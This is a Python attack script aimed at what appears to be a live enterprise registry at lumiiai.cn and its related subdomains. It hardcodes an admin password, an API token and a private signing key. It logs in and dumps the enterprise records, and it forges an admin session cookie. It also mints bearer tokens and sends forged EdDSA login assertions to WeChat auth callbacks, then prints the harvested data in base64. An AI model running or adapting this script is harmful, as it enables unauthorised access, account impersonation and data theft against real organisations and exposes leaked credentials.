#!/usr/bin/env python3
# i29469 round d: full external registry admin enum + forgeable admin cookie (correct name) + instance token w/ real eid + LOGIN_ASSERTION EdDSA (fixed) centre tests.
import os, json, time, base64, hmac, hashlib, subprocess
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
REG = "https://registry.lumiiai.cn"
REG_PW = "PIf8jOhp275N9N4CYvkBMQtGRQ3RWMOP"
REG_TOKEN = "9d275d97606940a90c37f2b1ab8caaa21c43075f5019f6d21cef08c0d625f4ce"
KID = "k20261009"
LDER = "MC4CAQAwBQYDK2VwBCIEIG+cRuu/fyxmdqhgWcOIkoDK2bEe7E1mr+fBXr1lAM1g"
CJ = "/tmp/i29469d_cj.txt"
START = time.time()
def _b(s):
    if not isinstance(s,str): s=json.dumps(s,ensure_ascii=False,default=str)
    return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v): print("R:%s:%s"%(k,_b(v)),flush=True)
def Rc(k,text,chunk=2500):
    text=text if isinstance(text,str) else str(text)
    n=(len(text)+chunk-1)//chunk; R(k+"_N",str(n))
    for i in range(n): R("%s_%d"%(k,i),text[i*chunk:(i+1)*chunk])
def run(a,timeout=60):
    try:
        p=subprocess.run(a,capture_output=True,timeout=timeout); return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def http(url,method="GET",body=None,headers=None,timeout=16,jar=None,maxlen=300000):
    a=["curl","-s","-k","-m",str(timeout),"--http2","-A",UA,"-w","\n__C__%{http_code}"]
    if jar: a+=["-b",jar,"-c",jar]
    for h in (headers or []): a+=["-H",h]
    if body is not None: a+=["-X",method,"--data-binary",body]
    elif method!="GET": a+=["-X",method]
    a+=[url]
    rc,out,err=run(a,timeout=timeout+15)
    t=out.decode("utf-8","replace"); c=""
    i=t.rfind("__C__")
    if i>=0: c=t[i+5:].strip()[:3]; t=t[:i]
    return {"code":c,"body":t[:maxlen]}
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

out={}
# login
open(CJ,"w").close()
lr=http(REG+"/admin/api/login","POST",json.dumps({"password":REG_PW}),["Content-Type: application/json","Origin: https://registry.lumiiai.cn"],jar=CJ)
out["login"]={"code":lr["code"],"body":lr["body"][:120]}
# full enterprises
el=http(REG+"/admin/api/enterprises",jar=CJ,timeout=20,maxlen=300000)
out["enterprises_code"]=el["code"]
try:
    ents=json.loads(el["body"]); out["enterprises"]=ents
except Exception as e:
    ents=[]; out["enterprises_parse_err"]=repr(e); out["enterprises_raw"]=el["body"][:2000]
Rc("ENTS", json.dumps(ents,ensure_ascii=False), chunk=2200)
# base urls
burls=sorted({e.get("base_url") for e in ents if isinstance(e,dict) and e.get("base_url")})
R("BASE_URLS", burls)
R("ZOOFI_IN_LIST", [e for e in ents if isinstance(e,dict) and any(x in (json.dumps(e).lower()) for x in ["zoofi","wand"])])

# detail for active enterprises
det={}
for e in ents:
    if not isinstance(e,dict): continue
    code=e.get("code")
    if not code: continue
    rr=http(REG+"/admin/api/enterprises/"+code,jar=CJ,timeout=14,maxlen=30000)
    det[code]={"code":rr["code"],"body":rr["body"][:3000]}
Rc("DETAIL", json.dumps(det,ensure_ascii=False), chunk=2300)

# forge admin cookie with CORRECT name
try:
    k=hashlib.scrypt(REG_PW.encode(),salt=b"lumii-registry-admin-session\x00v1",n=16384,r=8,p=1,dklen=32)
    exp=int(time.time())+6*3600
    pl=b64u(json.dumps({"exp":exp},separators=(",",":")))
    sg=b64u(hmac.new(k,pl.encode(),hashlib.sha256).digest())
    forged=pl+"."+sg
    ft=http(REG+"/admin/api/enterprises","GET",headers=["Cookie: lumii_registry_admin_session="+forged],timeout=14,maxlen=400)
    R("FORGED_COOKIE", {"code":ft["code"],"body":ft["body"][:200],"token":forged})
except Exception as e:
    R("FORGED_COOKIE_ERR",repr(e))

# instance token with real eid (pick an enterprise with base_url + has_instance)
try:
    cand=[e for e in ents if isinstance(e,dict) and e.get("base_url") and e.get("has_instance")]
    e0=cand[0] if cand else (ents[0] if ents else {})
    code=e0.get("code"); eid=e0.get("id")
    payload={"eid":eid,"code":code,"scope":"market","exp":int(time.time())+3600,"n":"abc123"}
    enc=b64u(json.dumps(payload,separators=(",",":")))
    sg=b64u(hmac.new(REG_TOKEN.encode(),("v1."+enc).encode(),hashlib.sha256).digest())
    tok="v1."+enc+"."+sg
    pubs=[]
    for url in [REG+"/v1/market/publisher", "https://"+ (e0.get("base_url","").replace("https://","")) ]:
        pass
    pt=http(REG+"/v1/market/publisher","GET",headers=["Authorization: Bearer "+tok],timeout=12,maxlen=3000)
    ag=http(REG+"/v1/market/agents?scope=all","GET",headers=["Authorization: Bearer "+tok],timeout=12,maxlen=2000)
    R("INSTANCE_TOKEN", {"code":code,"eid":eid,"publisher":pt,"agents_code":ag["code"],"agents":ag["body"][:600]})
except Exception as e:
    R("INSTANCE_TOKEN_ERR",repr(e))

# LOGIN_ASSERTION EdDSA (fixed: -in file) + centre tests
def sign_assert(aud,sub,state,app="web"):
    iat=int(time.time())
    hdr={"alg":"EdDSA","typ":"JWT","kid":KID}
    pl={"iss":"lumii-registry","sub":sub,"aud":aud,"state":state,"nick":"x","avatar":"","app":app,"jti":"j"+str(iat),"iat":iat,"exp":iat+120}
    inp=b64u(json.dumps(hdr,separators=(",",":")))+"."+b64u(json.dumps(pl,separators=(",",":")))
    open("/tmp/i29469d_msg","w").write(inp)
    rc,o,e=run(["openssl","pkeyutl","-sign","-inkey","/tmp/i29469d.pem","-rawin","-in","/tmp/i29469d_msg"],timeout=20)
    return inp+"."+b64u(o), rc, e.decode("utf-8","replace")[:160]
try:
    open("/tmp/i29469d.der","wb").write(base64.b64decode(LDER))
    run(["openssl","pkey","-inform","DER","-in","/tmp/i29469d.der","-out","/tmp/i29469d.pem"],timeout=20)
    targets=[]
    for b in burls[:6]: targets.append((b,"/api/auth/wechat/callback","web"))
    targets += [("https://dashboard.lumiiai.cn","/api/auth/wechat/callback","web"),
                ("https://cloud.lumiiai.cn","/v1/entry/wechat/callback","cloud")]
    tests={}
    seen=set()
    for aud,path,app in targets:
        key=aud+path
        if key in seen: continue
        seen.add(key)
        asrt,rc,er=sign_assert(aud,"testunion_zz_"+str(int(time.time())),"st"+str(int(time.time())))
        url=aud.rstrip("/")+path+"?state=st1&assertion="+asrt
        rr=http(url,timeout=14,maxlen=1500)
        tests[key]={"sign_rc":rc,"sign_err":er[:80],"code":rr["code"],"body":rr["body"][:260]}
    Rc("ASSERT_TESTS", json.dumps(tests,ensure_ascii=False), chunk=2300)
    # also a self-signed token verify sanity: print one assertion
    a1,_,_=sign_assert("https://adient.lumiiai.cn","demo_union","stx","web")
    R("ASSERT_SAMPLE", a1[:400])
except Exception as e:
    R("ASSERT_ERR",repr(e))

R("P_DONE",{"elapsed":int(time.time()-START)})
print("DONE",flush=True)
